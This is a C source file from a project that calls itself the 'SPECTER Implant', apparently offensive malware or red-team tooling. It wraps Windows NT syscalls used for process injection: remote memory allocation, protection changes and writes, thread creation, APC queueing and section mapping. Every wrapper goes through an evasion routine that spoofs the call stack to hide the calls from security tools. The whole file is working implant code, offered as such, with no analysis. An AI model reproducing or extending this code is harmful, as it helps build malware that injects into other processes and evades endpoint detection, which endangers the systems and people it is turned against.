/**
 * SPECTER Implant — Syscall Convenience Wrappers
 *
 * Each wrapper routes through the evasion engine's evasion_syscall()
 * which provides call stack spoofing around every syscall invocation.
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"

/* ------------------------------------------------------------------ */
/*  Helper: get evasion context from global implant context             */
/* ------------------------------------------------------------------ */

static EVASION_CONTEXT *get_evasion_ctx(void) {
    return (EVASION_CONTEXT *)g_ctx.evasion_ctx;
}

/* ------------------------------------------------------------------ */
/*  NtAllocateVirtualMemory                                             */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtAllocateVirtualMemory(HANDLE process, PVOID *base,
    ULONG_PTR zero_bits, PSIZE_T size, ULONG alloc_type, ULONG protect) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTALLOCATEVIRTUALMEMORY,
        process, base, zero_bits, size, alloc_type, protect);
}

/* ------------------------------------------------------------------ */
/*  NtProtectVirtualMemory                                              */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtProtectVirtualMemory(HANDLE process, PVOID *base,
    PSIZE_T size, ULONG new_protect, PULONG old_protect) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTPROTECTVIRTUALMEMORY,
        process, base, size, new_protect, old_protect);
}

/* ------------------------------------------------------------------ */
/*  NtFreeVirtualMemory                                                 */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtFreeVirtualMemory(HANDLE process, PVOID *base,
    PSIZE_T size, ULONG free_type) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTFREEVIRTUALMEMORY,
        process, base, size, free_type);
}

/* ------------------------------------------------------------------ */
/*  NtWriteVirtualMemory                                                */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtWriteVirtualMemory(HANDLE process, PVOID base,
    PVOID buffer, SIZE_T size, PSIZE_T written) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTWRITEVIRTUALMEMORY,
        process, base, buffer, size, written);
}

/* ------------------------------------------------------------------ */
/*  NtReadVirtualMemory                                                 */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtReadVirtualMemory(HANDLE process, PVOID base,
    PVOID buffer, SIZE_T size, PSIZE_T read_bytes) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTREADVIRTUALMEMORY,
        process, base, buffer, size, read_bytes);
}

/* ------------------------------------------------------------------ */
/*  NtCreateThreadEx                                                    */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtCreateThreadEx(PHANDLE thread, ULONG access,
    POBJECT_ATTRIBUTES oa, HANDLE process, PVOID start,
    PVOID param, ULONG flags, SIZE_T zero_bits,
    SIZE_T stack_size, SIZE_T max_stack_size, PVOID attr_list) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTCREATETHREADEX,
        thread, access, oa, process, start, param,
        flags, zero_bits, stack_size, max_stack_size, attr_list);
}

/* ------------------------------------------------------------------ */
/*  NtOpenProcess                                                       */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtOpenProcess(PHANDLE process, ULONG access,
    POBJECT_ATTRIBUTES oa, PCLIENT_ID cid) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTOPENPROCESS,
        process, access, oa, cid);
}

/* ------------------------------------------------------------------ */
/*  NtClose                                                             */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtClose(HANDLE handle) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTCLOSE, handle);
}

/* ------------------------------------------------------------------ */
/*  NtMapViewOfSection                                                  */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtMapViewOfSection(HANDLE section, HANDLE process,
    PVOID *base, ULONG_PTR zero_bits, SIZE_T commit_size,
    PLARGE_INTEGER offset, PSIZE_T view_size,
    SECTION_INHERIT inherit, ULONG alloc_type, ULONG protect) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTMAPVIEWOFSECTION,
        section, process, base, zero_bits, commit_size,
        offset, view_size, inherit, alloc_type, protect);
}

/* ------------------------------------------------------------------ */
/*  NtUnmapViewOfSection                                                */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtUnmapViewOfSection(HANDLE process, PVOID base) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTUNMAPVIEWOFSECTION,
        process, base);
}

/* ------------------------------------------------------------------ */
/*  NtOpenSection                                                       */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtOpenSection(PHANDLE section, ULONG access,
    POBJECT_ATTRIBUTES oa) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTOPENSECTION,
        section, access, oa);
}

/* ------------------------------------------------------------------ */
/*  NtCreateFile                                                        */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtCreateFile(PHANDLE file, ULONG access,
    POBJECT_ATTRIBUTES oa, PIO_STATUS_BLOCK iosb,
    PLARGE_INTEGER alloc_size, ULONG file_attr,
    ULONG share_access, ULONG disposition,
    ULONG create_options, PVOID ea_buffer, ULONG ea_length) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTCREATEFILE,
        file, access, oa, iosb, alloc_size, file_attr,
        share_access, disposition, create_options, ea_buffer, ea_length);
}

/* ------------------------------------------------------------------ */
/*  NtQueryInformationProcess                                           */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtQueryInformationProcess(HANDLE process,
    PROCESSINFOCLASS info_class, PVOID info, ULONG info_length,
    PULONG return_length) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTQUERYINFORMATIONPROCESS,
        process, info_class, info, info_length, return_length);
}

/* ------------------------------------------------------------------ */
/*  NtDelayExecution                                                    */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtDelayExecution(BOOL alertable, PLARGE_INTEGER interval) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTDELAYEXECUTION,
        alertable, interval);
}

/* ------------------------------------------------------------------ */
/*  NtWaitForSingleObject                                               */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtWaitForSingleObject(HANDLE handle, BOOL alertable,
    PLARGE_INTEGER timeout) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTWAITFORSINGLEOBJECT,
        handle, alertable, timeout);
}

/* ------------------------------------------------------------------ */
/*  NtQueueApcThread                                                    */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtQueueApcThread(HANDLE thread, PVOID apc_routine,
    PVOID arg1, PVOID arg2, PVOID arg3) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTQUEUEAPCTHREAD,
        thread, apc_routine, arg1, arg2, arg3);
}

/* ------------------------------------------------------------------ */
/*  NtSetInformationThread                                              */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtSetInformationThread(HANDLE thread,
    DWORD info_class, PVOID info, ULONG info_length) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTSETINFORMATIONTHREAD,
        thread, info_class, info, info_length);
}

/* ------------------------------------------------------------------ */
/*  NtTestAlert                                                         */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtTestAlert(void) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTTESTALERT);
}

/* ------------------------------------------------------------------ */
/*  NtCreateSection                                                    */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtCreateSection(PHANDLE section, ULONG access,
    POBJECT_ATTRIBUTES oa, PLARGE_INTEGER max_size,
    ULONG page_protect, ULONG alloc_attributes, HANDLE file) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTCREATESECTION,
        section, access, oa, max_size, page_protect, alloc_attributes, file);
}

/* ------------------------------------------------------------------ */
/*  NtContinue                                                         */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtContinue(PVOID context, BOOL raise_alert) {
    return evasion_syscall(get_evasion_ctx(), HASH_NTCONTINUE,
        context, raise_alert);
}
